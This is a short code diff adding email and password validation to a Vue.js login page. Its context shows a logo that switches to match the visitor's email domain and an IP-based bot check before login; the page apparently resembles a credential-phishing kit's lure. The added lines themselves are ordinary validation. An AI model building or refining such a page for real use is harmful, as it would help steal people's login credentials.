@@ -18,6 +18,21 @@ const app = Vue.createApp({
       },
     };
   },
+  computed: {
+    isValidEmail() {
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/; // Basic email validation regex
+      return emailRegex.test(this.email);
+    },
+    isValidPassword() {
+      return this.password.length >= 5;
+    },
+    emailError() {
+      return this.email && !this.isValidEmail;
+    },
+    passwordError() {
+      return this.password && !this.isValidPassword;
+    },
+  },
   methods: {
     async setLocalization() {
       try {
@@ -62,10 +77,16 @@ const app = Vue.createApp({
       }
     },
     requestPassword() {
-      this.updateLogo(); // Update the logo for the email domain
-      this.showPassword = true; // Show the password input phase
+      if (this.isValidEmail) {
+        this.updateLogo(); // Update the logo for the email domain
+        this.showPassword = true; // Show the password input phase
+      }
     },
     async verifyLogin() {
+      if (!this.isValidPassword) {
+        return;
+      }
+
       const { country, isBot } = await this.getIPInfo();
 
       if (isBot) {
@@ -109,3 +130,4 @@ const app = Vue.createApp({
 });
 
 app.mount('#app');
+
